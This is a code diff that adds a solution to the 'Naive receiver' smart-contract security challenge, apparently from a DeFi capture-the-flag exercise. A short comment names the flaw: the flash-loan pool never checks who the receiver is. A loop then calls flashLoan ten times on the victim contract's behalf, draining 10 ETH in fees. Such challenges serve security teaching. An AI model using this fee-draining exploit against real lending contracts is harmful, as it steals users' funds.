@@ -37,7 +37,16 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /* 
+            pool.flashLoan function is not checking that receiver is msg.sender
+            
+            We can call the flashloan 10 times in behalf of the receiver, receiving a 0 eth flashloan. 
+            This will make the receiver pay 10 ETH in fees.
+        */
+        const ETH = await pool.ETH();
+        for (let i = 0; i < 10; i++) {
+            await pool.flashLoan(receiver.address, ETH, 0, "0x")
+        }
     });
 
     after(async function () {
